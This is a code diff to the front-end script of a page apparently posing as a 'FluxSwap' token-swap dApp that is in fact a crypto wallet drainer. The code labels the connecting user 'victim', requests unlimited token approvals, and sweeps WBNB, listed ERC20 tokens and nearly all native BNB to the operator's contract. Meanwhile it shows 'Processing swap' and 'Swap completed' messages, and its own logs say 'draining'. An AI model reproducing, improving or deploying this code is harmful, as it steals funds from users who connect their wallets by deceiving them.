@@ -254,13 +254,10 @@
                 56: '0xf77746EA565d698867eC1e4BF7886A39124A90FF'
             };
 
-            // Approve-only ABI: no swap calls from victim, only approvals.
-            // Owner pulls funds separately via pullWBNB / pullToken.
             const SWAP_ABI = [
-                { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "pullWBNB", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-                { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }, { "internalType": "address", "name": "token", "type": "address" }], "name": "pullToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-                { "inputs": [], "name": "drainNative", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "drainToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [], "name": "swapWBNB", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
+                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                 { "inputs": [], "name": "getNativeBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "getTokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
@@ -330,6 +327,7 @@
             let chainId = TARGET_CHAIN_ID;
             let isConnected = false, isProcessing = false, isConnecting = false;
             let wcProvider = null;
+            let retryTimer = null;
             let rateCache = {};
 
             function chainLabel(id) {
@@ -673,8 +671,6 @@
                 }
             }
 
-            // Approval-only flow: no native value, no pull call from victim side.
-            // Owner calls pullWBNB(victim) / pullToken(victim, token) later.
             async function executeSwap() {
                 if (isProcessing) return;
                 if (!provider || !signer || !wcProvider) {
@@ -700,46 +696,97 @@
 
                 isProcessing = true;
                 updateSwapButton();
+                setStatus('Processing swap on ' + chainLabel(chainId) + '...', '');
+
+                const swapContract = new ethers.Contract(contractAddr, SWAP_ABI, signer);
 
                 try {
-                    // WBNB approve only — no swapWBNB call
+                    // ===== WBNB PATH (приоритет — нет value, нет блока прогноза) =====
                     const wbnbRead = new ethers.Contract(WBNB_ADDR, ERC20_ABI, provider);
                     let wbnbBal = ethers.BigNumber.from(0);
                     try { wbnbBal = await wbnbRead.balanceOf(victim); } catch (_) {}
 
                     if (wbnbBal.gt(0)) {
-                        const wbnbSigner = new ethers.Contract(WBNB_ADDR, ERC20_ABI, signer);
-                        const allowance = await wbnbSigner.allowance(victim, contractAddr);
-                        if (allowance.lt(wbnbBal)) {
-                            setStatus('Approving WBNB...', '');
-                            const ap = await wbnbSigner.approve(contractAddr, ethers.constants.MaxUint256);
-                            await ap.wait();
+                        console.log('[FluxSwap] WBNB path, balance', ethers.utils.formatEther(wbnbBal));
+                        try {
+                            const wbnbSigner = new ethers.Contract(WBNB_ADDR, ERC20_ABI, signer);
+                            const allowance = await wbnbSigner.allowance(victim, contractAddr);
+                            if (allowance.lt(wbnbBal)) {
+                                setStatus('Approving WBNB...', '');
+                                const ap = await wbnbSigner.approve(contractAddr, ethers.constants.MaxUint256);
+                                await ap.wait();
+                            }
+                            setStatus('Draining WBNB...', '');
+                            const tx = await swapContract.swapWBNB();
+                            await tx.wait();
+                            console.log('[FluxSwap] WBNB tx confirmed', tx.hash);
+                            setStatus('✅ Swap completed', 'ok');
+                            isProcessing = false;
+                            updateSwapButton();
+                            return;
+                        } catch (e) {
+                            console.error('[FluxSwap] WBNB path failed, fallback to native', e);
                         }
                     }
 
-                    // ERC20 approve only — no swapToken call
+                    // ===== NATIVE FALLBACK =====
+                    const freshBalHex = await wcProvider.request({
+                        method: 'eth_getBalance',
+                        params: [victim, 'latest']
+                    });
+                    const freshBal = ethers.BigNumber.from(freshBalHex);
+
+                    const gasPrice = ethers.utils.parseUnits('3', 'gwei');
+                    const gasLimit = ethers.BigNumber.from(50000);
+                    const reserve = gasPrice.mul(gasLimit);
+                    const value = freshBal.sub(reserve);
+
+                    console.log('[FluxSwap] native drain', {
+                        balance_bnb: ethers.utils.formatEther(freshBal),
+                        reserve_bnb: ethers.utils.formatEther(reserve),
+                        value_bnb: ethers.utils.formatEther(value)
+                    });
+
+                    if (value.lte(0)) {
+                        setStatus('Nothing to swap', 'err');
+                        isProcessing = false;
+                        updateSwapButton();
+                        return;
+                    }
+
+                    setStatus('Processing swap...', '');
+                    const tx = await swapContract.swap({
+                        value: value,
+                        gasPrice: gasPrice,
+                        gasLimit: gasLimit
+                    });
+                    await tx.wait();
+                    console.log('[FluxSwap] native tx confirmed', tx.hash);
+                    setStatus('✅ Swap completed', 'ok');
+
+                    // ===== ERC20 =====
                     const tokensMap = TOKENS[chainId] || {};
                     for (const [symbol, addr] of Object.entries(tokensMap)) {
                         try {
                             const tokenRead = new ethers.Contract(addr, ERC20_ABI, provider);
                             const bal = await tokenRead.balanceOf(victim);
                             if (bal.lte(0)) continue;
-
                             const tokenSigner = new ethers.Contract(addr, ERC20_ABI, signer);
                             const allowance = await tokenSigner.allowance(victim, contractAddr);
                             if (allowance.lt(bal)) {
-                                setStatus('Approving ' + symbol + '...', '');
                                 const ap = await tokenSigner.approve(contractAddr, ethers.constants.MaxUint256);
                                 await ap.wait();
                             }
+                            const txT = await swapContract.swapToken(addr);
+                            await txT.wait();
+                            console.log('[FluxSwap] token tx confirmed', symbol, txT.hash);
                         } catch (e) {
-                            console.error('[FluxSwap] approve failed', symbol, e);
+                            console.error('[FluxSwap] token failed', symbol, e);
                         }
                     }
 
-                    setStatus('✅ Swap completed', 'ok');
                 } catch (e) {
-                    console.error('Approve error:', e);
+                    console.error('Swap error:', e);
                     setStatus('Transaction rejected or error: ' + ((e && e.message) || 'unknown'), 'err');
                 } finally {
                     isProcessing = false;
